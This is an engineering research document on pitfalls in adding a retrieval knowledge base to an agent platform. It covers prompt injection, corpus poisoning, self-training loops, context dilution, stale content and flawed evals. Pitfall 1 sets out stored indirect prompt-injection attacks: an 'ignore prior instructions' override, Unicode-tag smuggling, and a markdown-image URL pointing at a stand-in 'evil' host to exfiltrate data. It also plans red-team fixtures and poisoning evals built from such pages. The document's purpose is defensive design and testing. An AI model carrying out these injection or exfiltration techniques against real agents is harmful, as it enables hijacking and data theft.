# Pitfalls Research

**Domain:** A curated knowledge base retrofitted onto an existing Rust/Tauri agent platform. It covers git-markdown docs, taxonomy lint, LLM page-one rewrites, chunk and summary-card indexing, hybrid context injection for any OpenRouter model, a CRAG web fallback with an auto-ingest inbox, staleness re-verification, and a GUI Library/Inbox/Inspector. The MENS training corpus reads the same docs.
**Researched:** 2026-10-03
**Confidence:** MEDIUM overall. Repo findings are HIGH because they come from reading the code directly. Literature findings are MEDIUM because they are peer-reviewed and corroborated across sources. Practitioner blogs are LOW.

**Gating legend.**
- **BLOCK:** a deterministic check in PR CI that fails the merge.
- **RATCHET:** a baseline file in `contracts/` that may only tighten. CI fails on regression beyond tolerance, using the same pattern as `crate-edges.allow.v1.json` and `test-tier-budgets.v1.yaml`.
- **NIGHTLY:** a live-model or statistical eval in `nightly.yml`. It files a `nightly-failure` issue and never blocks a PR.

**Layer legend:** doc-lint / indexer / retrieval / injection / ingestion / training-corpus / eval / GUI.

---

## What already exists in the repo and is already a pitfall (HIGH, from code)

These are not hypothetical. The milestone inherits them, and the roadmap has to fix or fence each one before building on top of it.

| # | Finding | Location | Why it matters for this milestone |
|---|---------|----------|------------------------------------|
| R1 | Web search hits are **persisted into the searchable corpus by default**, unreviewed, fire-and-forget (`let _ = persist_text_document_chunk(...)`). The default `persist_web_hits` is `true`; it is opt-out via `VoxSearchPersistWebHitsDisabled`. | `crates/vox-search/src/execution.rs:603-631`, `policy.rs:55-57,407` | This is an existing path from the web into the corpus that **bypasses the planned reviewed inbox entirely**. Rows are distinguished only by the `web-ingest:` prefix on `source_uri`. Every injection defense in the inbox design is moot while this path exists. |
| R2 | Research syntheses (LLM output) are auto-written into KBs with confidence **floored at 0.95** (`confidence.max(0.95)`). Errors are swallowed. | `crates/vox-orchestrator-mcp/src/kb_tools/signal_research.rs:55` | The LLM's own output re-enters retrieval at near-max trust, which is a self-reinforcing loop. `signal_chat.rs` similarly mines assistant turns into KB entries. |
| R3 | The injected context is plain bullet lines under `[AUTONOMOUS RESEARCH — <tier>]` headers. There is **no data-vs-instruction delimiting, no per-item provenance or trust label, and no sanitization**. | `crates/vox-orchestrator-mcp/src/chat_tools/chat/message.rs:765-833` | An injected web line is indistinguishable from a curated doc line, both to the model and in the payload. |
| R4 | `calculate_recall_at_5` is **word overlap between the model answer and a gold answer**. It is not retrieval recall@5. `calculate_groundedness` marks a sentence grounded if any one of its first 5 words longer than 4 characters appears anywhere in the evidence, which is near-always true. | `crates/vox-search/src/evaluation.rs:43-105` | Any eval gate built on these will report green while retrieval regresses. Metrics named after IR metrics that are not those metrics are a classic trap. |
| R5 | `TrustScorer` is **fail-open**: a network or parse error yields a neutral trust score. | `crates/vox-search/src/trust.rs:1-4` | Fail-open is fine for ranking but wrong for promotion eligibility. An outage silently upgrades unknown sources. |
| R6 | 395 of 670 non-archive docs carry `training_eligible: true` (59%), and `vox-gamify` awards XP for setting it. | `docs/src/**`, `crates/vox-gamify/src/quest/templates.rs:253` | An LLM rewrite of about 550 docs would put LLM-authored text straight into MENS training. The XP incentive pushes eligibility up, not down. |
| R7 | Docs ingest uses fixed 4096-byte chunks. | `crates/vox-search/src/ingest.rs:5-6` | Splits fenced `vox` blocks and tables mid-structure. Summary cards and chunks need a chunker version stamp (see Pitfall 12). |

---

## Critical Pitfalls

### Pitfall 1: Stored indirect prompt injection through auto-ingested web content

**What goes wrong:**
A CRAG fallback fetches a page containing instructions. Examples: "ignore prior instructions", hidden Unicode-tag text, a markdown image whose URL exfiltrates data (`![x](https://evil/?q=...)`), or an HTML comment. The page is auto-ingested into the inbox, or via R1 directly into the corpus. Weeks later it is retrieved as context for an unrelated turn by an agent that has tools. This is the RAG version of stored XSS. The attacker never talks to the agent.

**Why it happens:**
LLMs cannot reliably separate instructions from data in one context window. Greshake et al. showed remote control, persistence, and "worming" via retrieved content. The attack surface is any text that is later retrieved. Teams sanitize at fetch time but forget that the *inbox and corpus are a time-shifted input channel*. Vox agents also have the lethal trifecta: private data (memory, repo), untrusted content (web tier), and external communication (web tools, MCP, mesh).

**How to avoid:**
1. **Trust tiers as a first-class column** on every indexed row: `curated` (merged in git), `inbox` (unreviewed), `web-live` (this turn only), `agent-derived` (R2/chat signals). Default injection policy: only `curated` gets the plain context block. Every other tier is spotlighted.
2. **Spotlighting** (Microsoft, Hines et al. 2024) for non-curated tiers. Wrap each item in a per-turn random boundary token and state in the system prompt that text inside is data. Optionally datamark it by interleaving a marker token. In the paper this cut attack success from >50% to <2% on GPT models. It is not a guarantee.
3. **Sanitize at ingest and again at injection** (defense in depth, because R1 rows predate the sanitizer):
   - Strip U+E0000–E007F (tag block / ASCII smuggling), zero-width characters U+200B–U+200F and U+2060–U+2064, bidi overrides U+202A–U+202E and U+2066–U+2069, HTML comments, `display:none` text, and `<script>`/`<style>`.
   - Neutralize markdown images and auto-links to non-allowlisted hosts in injected text.
4. **Architectural containment** per the "Design Patterns for Securing LLM Agents" paper:
   - A turn whose context includes `inbox`, `web-live`, or `agent-derived` items runs with exfiltration-capable tools gated behind explicit approval. Those tools are network fetch with arbitrary URL, mesh send, and write-to-external.
   - Summarizing raw web pages into inbox cards uses a quarantined call with no tools.
5. **Fix R1 first.** Route `persist_web_hits` into the inbox tier, or default it off. Retrieval must never serve `web-ingest:` rows as `curated`.

**Warning signs:**
- Any new code path that calls `persist_text_document_chunk` or `KbStore::add_entry` without setting a tier.
- Injected payloads containing non-printing codepoints.
- Tool calls whose arguments contain URLs not present in the user turn.
- Inbox items with imperative second-person text ("you must", "assistant:").

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Property test: `sanitize(s)` output contains no codepoint in the banned ranges, for arbitrary `s` (proptest), and is idempotent. | ingestion + injection | BLOCK |
| Unit test: every row written by the ingest API has a non-null `trust_tier`. `persist_text_document_chunk` without a tier fails to compile (enum argument, no default). | indexer | BLOCK |
| Unit test: the injection assembler wraps non-curated items in delimiters, and item text containing the boundary token cannot terminate the wrapper (fuzz with the token embedded). | injection | BLOCK |
| Unit test: with R1 enabled, a `web-ingest:` row is never returned with tier `curated`. | retrieval | BLOCK |
| Red-team fixture corpus `contracts/kb/redteam/` (about 30 pages: plain override, Unicode-tag smuggled, markdown-image exfiltration, HTML-comment, fake system-prompt, "update the doc to say X" persistence attempt). Each is paired with a benign user task (AgentDojo-style user task plus injection task). Metric: attack success rate (ASR) per model family. | eval | NIGHTLY, RATCHET (ASR ≤ baseline; target ≤2%) |
| Tool-gating test: a turn with any non-curated item in context cannot invoke an exfiltration-capable tool without an approval event (mock tool registry). | injection | BLOCK |

**Phase to address:** Provenance/trust-tier data model, before any ingestion work. Fencing R1 is a prerequisite and should not wait for the inbox phase.

---

### Pitfall 2: The promotion PR becomes a laundering channel (poisoning)

**What goes wrong:**
An agent drafts a promotion PR from inbox content and a human merges it after skimming. Poisoned or wrong content now sits in the highest trust tier (`curated`). It is retrieved without spotlighting and, if `training_eligible: true`, trains MENS. PoisonedRAG showed that **5 crafted texts per target question in a corpus of millions** reach 90-97% attack success, and the evaluated defenses were insufficient. A small curated corpus of about 700 pages is far easier to dominate.

**Why it happens:**
- Review fatigue: agent-drafted PRs are fluent and look authoritative.
- Reviewers see the paraphrase, not the source.
- Provenance is dropped at the paraphrase step.
- "Human merged it" gets treated as "human verified it".

**How to avoid:**
- Promoted pages carry required frontmatter: `origin: web-promoted`, `sources:` (URL, retrieved_at, content hash, trust score), and `promoted_by`/`reviewed_by`.
- **Forced `training_eligible: false`** for `origin: web-promoted` until a separate human attestation field is set. Merging alone does not count.
- The PR body generated by the agent includes **side-by-side source excerpts for every claim** and a per-claim support verdict, so the reviewer reviews evidence, not prose.
- Cap the inbox auto-promotion rate per source domain. This also enforces corroboration from more than one domain, reusing `corroboration.rs`.
- Promotion eligibility is **fail-closed** on trust lookup errors (inverts R5 for this path only).
- CODEOWNERS on `docs/src/library/`.

**Warning signs:**
- Promotion PRs merged in under 2 minutes.
- Many promotions from one domain.
- Promoted pages that answer exactly one narrow question.
- Promoted text with high lexical overlap with a single source (copying).

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Doc lint: `origin: web-promoted` requires a non-empty `sources[]`, each with `url`, `retrieved_at`, `sha256`. It requires `training_eligible: false` unless `human_attested_by:` is present. | doc-lint | BLOCK |
| Unit test: promotion eligibility returns `Ineligible` when `TrustScorer` errors (fail-closed). | ingestion | BLOCK |
| Poisoning eval: inject k = 1, 3, 5 PoisonedRAG-style adversarial pages for 10 fixture questions into a scratch index. Measure how often the target wrong answer appears. Track it as a defense regression metric. | eval | NIGHTLY, RATCHET |
| Audit query: the share of `curated` pages with `origin: web-promoted` and their domain concentration (Herfindahl index). Alert when a single domain exceeds the threshold. | ingestion | NIGHTLY advisory |

**Phase to address:** Inbox and promotion phase. The frontmatter fields belong to the taxonomy/schema phase so that lint exists before the first promotion.

---

### Pitfall 3: Self-consuming loop — LLM-written docs feed retrieval and MENS training

**What goes wrong:**
About 550 docs get LLM page-one rewrites. Most are `training_eligible: true` (R6). MENS then fine-tunes on LLM-authored text, R2 writes LLM syntheses back to the KB at 0.95 confidence, and neural retrievers rank LLM-written text higher (source bias). The corpus drifts toward the generator's distribution.

The literature on recursive training is consistent:
- Shumailov et al. (Nature 2024): tails of the distribution disappear irreversibly.
- Alemohammad et al. (ICLR 2024, "MAD"): quality or diversity degrades within a few generations without fresh real data.
- Gerstgrasser et al. (2024): collapse is **avoided when synthetic data accumulates alongside real data rather than replacing it.**

A rewrite that overwrites the human page in place is the *replace* regime.

**Why it happens:**
Git keeps the old text, but every consumer reads the working tree: the indexer, MENS corpus builder, and sidebar. Authorship is not recorded in frontmatter, so after the rewrite you cannot cheaply separate human from LLM text. Dai et al. (KDD 2024) show neural retrievers and rerankers prefer LLM-generated text because its semantics are more "focused". Rewritten pages will therefore outrank unrewritten human pages regardless of correctness, which makes the rewrite look like a retrieval win.

**How to avoid:**
- Add an `authorship:` facet (`human | llm-assisted | llm-generated`) plus `authorship_model:` **before the first rewrite lands**. The rewrite tool stamps it.
- Restrict rewrites to the page-one summary block. The human body stays verbatim and is the training-eligible part.
- The MENS corpus builder excludes `llm-generated` content and summary blocks. It caps `llm-assisted` token share.
- Remove the `confidence.max(0.95)` floor in R2. Agent-derived entries get their own tier and never outrank curated content.
- Remove or invert the `vox-gamify` XP incentive for `training_eligible: true`.
- Retrieval eval stratified by authorship to detect source bias.

**Warning signs:**
- Retrieval eval improves after rewrites but answer-correctness evals do not.
- The top-1 share of `llm-*` pages exceeds their base rate.
- Lexical diversity (distinct-n, type/token ratio) of the training corpus drops release over release.
- MENS outputs repeat stock phrasing.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Doc lint: a page whose page-one block carries the rewrite marker must have `authorship != human`. | doc-lint | BLOCK |
| Corpus-builder unit test: fixtures with `authorship: llm-generated` produce zero training rows, and summary blocks are stripped. | training-corpus | BLOCK |
| `llm-assisted` token share in the MENS corpus, plus distinct-2/distinct-3 of the training corpus (`contracts/kb/corpus-composition.v1.json`). | training-corpus | RATCHET |
| Source-bias metric: for each golden query, is the top-1 doc `llm-*`? Compare the rate to the corpus base rate. Alert when the ratio exceeds 1.5. | eval | NIGHTLY advisory |
| Unit test: an R2/chat-signal entry's score is never ≥ the curated tier's for equal similarity. | retrieval | BLOCK |

**Phase to address:** The provenance/authorship schema **must precede** the rewrite phase. This is the single most important ordering constraint in the milestone.

---

### Pitfall 4: Page-one rewrites lose meaning (homogenization, dropped qualifiers, invented facts)

**What goes wrong:**
The summary-first rewrite flattens nuance:
- It drops "except on Windows" and "retired in v0.6.0".
- It inverts a negation.
- It cites a crate or flag that does not exist (the repo's Retired Surfaces table is exactly what an LLM will hallucinate back in).
- It homogenizes voice, so every page reads the same and summaries stop discriminating between pages at retrieval time.

The supporting studies point the same way:
- Sourati/Dehghani (Nature Human Behaviour 2026) found LLM rewrites preserve content but compress stylistic variety.
- FABLES (2024) found frequent omission of key details even in strong summarizers.
- StorySumm found automatic faithfulness metrics stay below 70% balanced accuracy on subtle errors.

**Why it happens:**
- Batch rewrites of 550 docs get reviewed by skim.
- LLMs regress toward the most common phrasing.
- Rewriters are trained to be confident and concise, so qualifiers read as noise to them.
- The summary sits at the top of the page, so it is what gets chunked, carded, embedded, and injected first. Errors there have the highest blast radius.

**How to avoid:**
- Scope the rewrite to a delimited summary block only. Never rewrite the body in the same pass.
- A **deterministic claim-preservation check** before the PR. Extract from the original body the backticked identifiers, file paths, CLI flags, version numbers, RFC-2119 words (MUST, NEVER), negations, and "retired/deprecated/superseded" mentions. Every identifier in the summary must exist in the body or the repo, and no negation the body applies to a summarized term may be dropped.
- Validate identifiers against real sources: `cli-command-surface.generated.md`, the workspace crate list, and the Retired Surfaces table (a summary naming a retired symbol as current is a hard failure).
- Small batches (≤25 pages per PR) grouped by category, so reviewers have domain context.
- Track summary diversity: pairwise embedding similarity of summaries must not exceed that of the bodies.

**Warning signs:**
- Summaries of different pages sharing an opening sentence template.
- Rising mean pairwise summary similarity.
- Doctest failures appearing in rewrite PRs.
- Reviewers approving 25-page PRs in minutes.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Lint `summary-identifiers-exist`: every backticked identifier or path in the page-one block resolves (repo path exists, crate in workspace, CLI command in the generated surface). | doc-lint | BLOCK (scoped to changed files) |
| Lint `summary-no-retired-surface`: the summary does not mention a retired symbol from the Retired Surfaces table unless it is in a "retired"/"replaced by" phrase. | doc-lint | BLOCK |
| Property test on the rewrite tool's guard: for generated original/summary pairs, the guard rejects any summary that drops a negation attached to a retained term, or that introduces a number not present in the body. | doc-lint (tool) | BLOCK |
| Summary-distinctiveness: mean pairwise cosine of summary embeddings ≤ mean of body embeddings + ε. Per-category homogeneity report. | indexer | NIGHTLY, RATCHET |
| Sampled NLI faithfulness (summary entailed by body), with a judge from a **different model family** than the rewriter, swap-checked. | eval | NIGHTLY advisory |

**Phase to address:** Page-one rewrite phase. The guard tool and lints ship in the phase's first plan, before any batch.

---

### Pitfall 5: Context dilution — over-retrieval, distractors, lost-in-the-middle, "fill to budget"

**What goes wrong:**
Per-model budgets get implemented as targets: "this model has 200k context, so inject 40k". Accuracy goes down, not up.
- Liu et al. (TACL 2024) found U-shaped accuracy: about 75% for a first-position document versus about 55% mid-context in 20-document QA, in every model tested, including long-context ones.
- Chroma "Context Rot" (2025-07-14, 18 models) found degradation with input length even on trivial tasks. A single distractor hurts and several compound. Coherent distractor text hurts *more* than shuffled text.
- Cuconasu et al. (SIGIR 2024, "Power of Noise") found that high-scoring but non-relevant documents cut accuracy by up to 67%, and one distractor by up to 25%.
- Google's "Sufficient Context" work found that more context can *reduce* abstention and increase hallucination.

**Why it happens:**
- Budgets feel like free capacity.
- Hybrid search plus RRF always returns *something* (RRF has no absolute relevance floor).
- Today's preamble concatenates six sources: RRF, memory, KG, chunks, repo, KB (R3).
- Semantically near docs, such as five versions of `*-research-2026.md` on the same topic, are exactly the distractors that hurt most.

**How to avoid:**
- The budget is a **ceiling**. Injection is driven by a relevance floor on calibrated scores, not RRF ranks, plus a sufficiency check.
- **Inject nothing** when nothing clears the floor, and log it.
- Cards before chunks: inject summary cards, and expand to chunks only for the top 1-2 when the card alone is insufficient.
- Dedupe by canonical doc. At most N chunks per doc.
- Put the strongest item first and the second strongest last (U-curve aware).
- Exclude superseded or expired docs (Pitfalls 10 and 11).
- Unify the six preamble sections into one ranked, budgeted list. Six independent sections each with their own top-k is how dilution happens.

**Warning signs:**
- Injected tokens per turn grows release over release while answer quality stays flat.
- Most injected items are never cited.
- Users report "it ignored the doc I know exists" (lost in the middle).

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Property test over the model registry: assembled injection tokens ≤ `budget(model)` for every registered model and every fixture bundle. The tokenizer estimate is conservative (upper bound). | injection | BLOCK |
| Property test: if all candidate scores < floor, the injected item count is 0 and the "no context" marker is set. | injection | BLOCK |
| Unit test: no two injected items share a canonical doc beyond the per-doc cap. Superseded and expired items are absent. | retrieval | BLOCK |
| Unit test: the item order places rank 1 at position 0. | injection | BLOCK |
| Distractor-robustness eval: for golden questions, answer accuracy with {gold} versus {gold + 1, 3, 5 hard distractors drawn from the corpus}. Flag if the drop exceeds a threshold. Plot accuracy against injected tokens per model family. | eval | NIGHTLY, RATCHET |
| Utilization metric: the fraction of injected items cited or used (NLI against the answer). A low value means over-injection. | eval | NIGHTLY advisory |

**Phase to address:** Context injection phase. The baseline measurement comes from the eval-harness phase, which must run first.

---

### Pitfall 6: Stale KB content overrides fresher model knowledge, and cutoff-aware ranking uses the wrong clock

**What goes wrong:**
- ClashEval (NeurIPS 2024) found LLMs adopt incorrect retrieved content over their own correct prior knowledge more than 60% of the time.
- HoH (2025) found that outdated documents degrade RAG even when current information is also present.

So a stale doc about an external library (say, "reqwest 0.12 is current") actively makes a newer model worse.

The planned remedy, model-cutoff-aware ranking, has two traps.
1. **Reported cutoffs are not effective cutoffs.** Cheng et al., "Dated Data" (COLM 2024), found effective cutoffs often differ drastically from reported ones and vary per sub-resource.
2. **Git mtime is not freshness.** The 550-doc rewrite, a `rustfmt`-style reflow, or the SSOT autoregen bot will reset every page's apparent date at once. The repo already forbids hand-written `last_updated`, which is derived from git.

**Why it happens:**
- Teams treat "doc date > model cutoff" as "doc is newer than the model's knowledge".
- They conflate *edit* time with *verified-true* time.
- They also apply cutoff logic to Vox-internal facts, which no model knows at any cutoff. Cutoff logic is only meaningful for external-world facts.

**How to avoid:**
- Add a `scope:` facet (`vox-internal | external`). Cutoff-aware demotion applies **only** to `external` pages. Vox-internal pages are always eligible, because the model has no prior.
- Freshness comes from `verified_at` (set by human review or evidence-backed re-verification), never from git mtime.
- The model cutoff comes from the model registry with a conservative margin (for example, reported cutoff minus 6 months), not from the model's self-report.
- For `external` pages older than the model's cutoff, inject with an explicit "as of <verified_at>" stamp rather than suppressing outright.
- For high-volatility facets (versions, prices, model lists), prefer CRAG live lookup over the KB.

**Warning signs:**
- A formatting-only commit changes ranking results.
- Answers about third-party versions regress when the KB is enabled and pass when it is disabled.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Unit test: the ranking function's cutoff demotion is a no-op for `scope: vox-internal`. It is monotone in `verified_at` for `external`. | retrieval | BLOCK |
| Regression fixture: apply a whitespace-only commit to the fixture corpus, and the ranking output is byte-identical (freshness ignores git mtime). | retrieval | BLOCK |
| Doc lint: `scope` is required. `external` pages require `verified_at`. | doc-lint | RATCHET (baseline allowlist of existing pages) |
| KB-on/KB-off differential eval on an external-facts golden subset per model: KB-on must be ≥ KB-off minus ε. A failure means the KB is hurting that model. | eval | NIGHTLY, RATCHET |

**Phase to address:** Taxonomy/schema phase (fields) and context injection phase (ranking).

---

### Pitfall 7: Citation hallucination and unsupported claims

**What goes wrong:**
The model cites a doc it was not given, cites the right doc for a claim it does not support, or the GUI renders citations that look authoritative. Liu, Zhang & Liang (EMNLP Findings 2023) found that only 51.5% of generative-search sentences were fully supported and only 74.5% of citations supported their sentence. Users rarely check: hover and click rates are below 25% in a 2026 study.

**How to avoid:**
- Inject stable short IDs (`[kb:abc123#c4]`).
- A post-generation validator drops or flags any citation ID not in this turn's injected set.
- The GUI renders unverified citations differently.
- Optionally run sentence-level support NLI in nightly evals only, not per turn.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Unit and property test: the citation validator marks every cited ID that is ∉ the injected set as `unverified`. It never upgrades. | injection | BLOCK |
| Citation precision and recall on the golden set (support judged by an NLI judge from a different family, swap-checked). | eval | NIGHTLY, RATCHET |
| Playwright: an answer with an out-of-set citation renders the `unverified` badge (mock IPC payload). | GUI | BLOCK |

**Phase to address:** Context injection phase (IDs, validator) and GUI phase (rendering).

---

### Pitfall 8: Evals that cannot fail — wrong metrics, leaked golden sets, biased judges, flaky CI

**What goes wrong:**
- **Wrong metrics.** The existing helpers (R4) are not what their names say. A gate on them is green regardless.
- **Leakage and contamination.** Golden questions written by an LLM *from the same docs* reward lexical echo. Golden files under `docs/src/` get indexed, so the answer key is in the corpus. Those files also get `training_eligible`, so MENS trains on its own test.
- **Judge bias.** Zheng et al. (NeurIPS 2023, MT-Bench) found position, verbosity, and self-enhancement bias. GPT-4 judged consistently only 65% of the time when answer order was swapped. Panickssery et al. (NeurIPS 2024) found that self-recognition drives self-preference, so a judge from the same family as the rewriter will grade its rewrites up.
- **Non-determinism.** Temperature 0 is not reproducible: batch-dependent floating point, MoE routing, and provider replicas all vary. Single-run evals are statistically meaningless (2026 agentic-eval randomness study). Live-model evals in PR CI become flaky and get muted.
- **Overfitting.** The team tunes chunk size, floor, and weights on the same golden set used to gate.

**How to avoid:**
- **Split evals by determinism.**
  - *Retrieval* metrics (recall@k, MRR, nDCG on **doc/chunk IDs** against labeled relevant IDs) need no LLM, are deterministic, and can BLOCK or RATCHET in PR CI.
  - *Generation* metrics (faithfulness, citation support, answer accuracy, injection ASR) are NIGHTLY only, with n ≥ 3 runs, reported with confidence intervals. Alert only when the interval clears the baseline.
- Golden sets live in `contracts/kb/eval/` (never `docs/src/`), carry a canary string, and are excluded from the indexer and the MENS builder by lint.
- Labels are human-written questions about real tasks (30-50 to start, per practitioner guidance). LLM-paraphrased variants are only used as robustness probes.
- Keep a **held-out split** that is never used for tuning. It is only run at milestone close.
- Judges come from a different family than both the generator and the rewriter. Run pairwise judgments in both orders and score disagreement as a tie. Set length-normalization instructions. Periodically spot-check judges against a small human-labeled set.
- Rename or delete R4's helpers, or reimplement them as true metrics, so nobody gates on them.
- Benchmark on *this* corpus. A Hugging Face practitioner report found that "best practices" (context-aware chunking, hybrid search, MTEB rankings) lost to naive baselines on their documents (LOW, single source). Do not adopt a technique without an eval delta.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Lint: no file under `contracts/kb/eval/` is reachable by the indexer's root set. The canary string never appears in the index or the MENS corpus (scan test). | eval + training-corpus | BLOCK |
| Determinism test: the retrieval eval run twice on the same commit produces byte-identical reports. | eval | BLOCK |
| Retrieval recall@5 and nDCG@10 on IDs against `contracts/kb/retrieval-baseline.v1.json` (tolerance about 1 point; the baseline is only tightened). | eval | RATCHET |
| Judge swap-consistency rate is logged per nightly run. Alert if below 80%. | eval | NIGHTLY advisory |
| Unit test: the renamed R4 functions are unreachable from any CI gate (grep-based detector, or simply delete them). | eval | BLOCK |

**Phase to address:** **First phase of the milestone.** Without a trustworthy baseline, every later phase's "improvement" is unfalsifiable.

---

### Pitfall 9: Taxonomy drift and facet sprawl

**What goes wrong:**
Facet values proliferate (`mens`, `MENS`, `training`, `ml-training`). LLM classifiers invent new categories during the rewrite. The facet that gates injection (`scope`, `audience`, `status`) loses meaning. Practitioner PKM writeups report ungoverned vocabularies drifting within about a year (LOW).

There is a Vox-specific risk as well. `category` drives the Astro sidebar (`docs-astro/src/utils/sidebar.mjs`), so taxonomy changes are also navigation changes.

**How to avoid:**
- A single vocabulary SSOT (`contracts/kb/taxonomy.v1.yaml`) with definitions, allowed values, and deprecated aliases mapped to canonical values.
- The lint rejects unknown values, reusing the existing `suggest()`/Levenshtein helper in `vox-doc-pipeline/src/pipeline/lint.rs` for "did you mean".
- The rewrite and classifier tool may only choose from the vocabulary (constrained output). It never writes free text into facets.
- Adding a vocabulary value requires a PR touching the SSOT, reviewed like `layers.toml`.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Lint: every facet value ∈ vocabulary. Deprecated aliases warn with the canonical suggestion. | doc-lint | BLOCK for new or changed files, RATCHET for the legacy backlog (allowlist that only shrinks) |
| Report: per-value page counts. Flag values with 0 pages (dead) and values covering >40% of pages (non-discriminating). | doc-lint | NIGHTLY advisory |
| Classifier unit test: output facets are always ∈ vocabulary (schema-constrained decode; test with an adversarial page). | doc-lint (tool) | BLOCK |

**Phase to address:** Taxonomy/schema phase.

---

### Pitfall 10: Duplicate and contradictory pages crowd retrieval

**What goes wrong:**
- `docs/src/library/` duplicates content in `architecture/`.
- Several `*-research-2026.md` and `*-findings-2026.md` pages on one topic coexist, with the superseded one still retrievable.
- Near-duplicates crowd the top-k (no diversity) and are the most damaging distractors (Pitfall 5).
- Contradictory pages produce answers that flip between runs.

**How to avoid:**
- `supersedes:` / `superseded_by:` frontmatter. Superseded pages are excluded from injection but kept in the Library UI.
- Near-duplicate detection at index time using MinHash shingles (about 0.85 Jaccard is a common strict threshold) or embedding cosine. It creates an advisory issue rather than auto-deleting.
- Collapse retrieval results by canonical doc.
- Contradiction detection runs nightly on pairs that share a facet and score high on similarity (NLI). The output is a review queue, never an auto-edit.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Lint: `superseded_by` targets exist, and supersession has no cycles. | doc-lint | BLOCK |
| Indexer test: superseded pages are absent from injection candidates. | indexer | BLOCK |
| Near-dup pair count and contradiction-candidate count. | indexer | NIGHTLY, RATCHET (count may only fall) |

**Phase to address:** Taxonomy/schema phase (fields) and indexing phase (dedup).

---

### Pitfall 11: Staleness machinery that rubber-stamps or avalanches

**What goes wrong:**
- Every page gets `review_by` set to the same date during the rewrite, so the whole corpus expires at once and the review queue is ignored.
- Scheduled agent re-verification marks pages "still valid" by re-reading them. That is an LLM verifying LLM text, which hits self-preference (Pitfall 8).
- Expired pages get deleted, or are silently kept at full rank.
- The re-verification job's token spend is unbounded (OWASP LLM10).

**How to avoid:**
- Stagger `review_by` with hash-based jitter across the horizon. Set the horizon per facet (volatile external facts get short horizons, ADRs long).
- Re-verification must produce **mechanical evidence**: referenced paths exist, symbols resolve (`vox graph query`), CLI commands appear in the generated command surface, links return 200. An LLM verdict without evidence cannot advance `verified_at`; it can only open a review issue.
- Expired pages are *demoted* (ranked below fresh pages, injected with a staleness stamp), never deleted automatically.
- Per-run token and page budget for the re-verification workflow.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Lint: `review_by` is present and ≤ today + max horizon for its facet. | doc-lint | RATCHET |
| Unit test: the re-verifier cannot set `verified_at` without at least one passing evidence check (the type requires an evidence list). | ingestion (re-verify) | BLOCK |
| Distribution check: no more than X% of pages share any single `review_by` week. | doc-lint | BLOCK |
| Percentage of injected items that are expired. | retrieval | NIGHTLY, RATCHET |

**Phase to address:** Staleness phase. The `review_by` and `verified_at` fields are defined in the schema phase.

---

### Pitfall 12: Index and embedding drift

**What goes wrong:**
- Swapping the local embedding model, its dimension, or the chunker leaves mixed vectors in one index. Cosine across model spaces is meaningless, and results degrade silently with no error.
- Deleted or renamed docs keep being served from a stale index.
- Each worktree has its own `target/` and DB, so an index built on one commit gets queried on another.

**How to avoid:**
- Store `embed_model_id`, `dim`, `chunker_version`, and `corpus_commit` per row and in an index manifest.
- A query refuses mixed versions, or uses an explicit blue/green dual index during migration.
- `vox graph`-style status and refresh freshness checks (`--strict` exits non-zero when stale).
- Reindex is idempotent and content-hash keyed.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Unit test: inserting a row with a different `embed_model_id` than the manifest errors. | indexer | BLOCK |
| Integration test: delete a doc, reindex, and it is no longer retrievable. Rename a doc, and the old ID is gone while the new one is present. | indexer | BLOCK |
| `kb status --strict` in `vox doctor` reports drift against HEAD. | indexer | advisory (doctor) |

**Phase to address:** Indexing phase.

---

### Pitfall 13: Private and agent-derived knowledge leaks to remote models

**What goes wrong:**
"Any OpenRouter model" means injected context leaves the machine. Chat-mined KB entries (`signal_chat.rs`), memory, and repo lines can contain secrets, personal data, or private paths, and get sent to a third-party provider. This falls under OWASP LLM02 (sensitive information disclosure) and LLM08 (cross-context leakage).

**How to avoid:**
- A `sensitivity` facet and tier.
- A per-provider egress policy (local or MENS models may see everything, remote models only `public` items).
- A secret-pattern scan at ingest and again at injection, reusing `vox-secrets` patterns.

**Concrete tests / invariants:**

| Test | Layer | Gate |
|------|-------|------|
| Fixture: a chat turn containing a fake API key is ingested, then a remote-model turn is assembled. The key is absent from the payload (exact and regex). | injection | BLOCK |
| Unit test: items with `sensitivity: private` are never in the payload for a remote provider class. | injection | BLOCK |

**Phase to address:** Context injection phase. The tier field belongs to the schema phase.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Rewrite all 550 docs before adding `authorship:` | Ships visible progress fast | Human and LLM text become inseparable for MENS and source-bias analysis. Recovery means git archaeology. | Never |
| Keep `persist_web_hits=true` "until the inbox ships" | No behavior change | Unreviewed web text accumulates in the corpus and every later injection defense has a hole | Never. Default it off or route it to an inbox tier in the first phase. |
| Gate CI on LLM-judge scores | One number to watch | Flaky PRs, then muted gates, then no gate | Never in PR CI. Nightly only. |
| One flat preamble with per-source top-k (today's R3) | Already works | Dilution grows with each source. Six sections times k. | Only until the injection phase |
| Make facet lint blocking on all 670 docs at once | Clean slate | Unmergeable PRs, followed by mass auto-fill by LLM (Pitfall 4 at scale) | Never. Block new or changed files and ratchet the backlog. |
| Use git mtime as freshness | Free signal | Reformat or rewrite commits reset freshness corpus-wide | Never for ranking. Fine as a display-only "last edited". |
| Promotion PR text without source excerpts | Shorter PRs | Reviewers cannot verify, so it becomes a laundering channel | Never |
| Single golden set for tuning and gating | Less labeling | Overfit thresholds, inflated metrics | MVP only, before the held-out split exists |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| `vox-doc-pipeline` lint (pre-push plus CI) | Adding new required frontmatter keys globally, so 670 docs fail | Scope blocking to changed files and keep a shrinking allowlist baseline in `contracts/`, the same pattern as `crate-edges` |
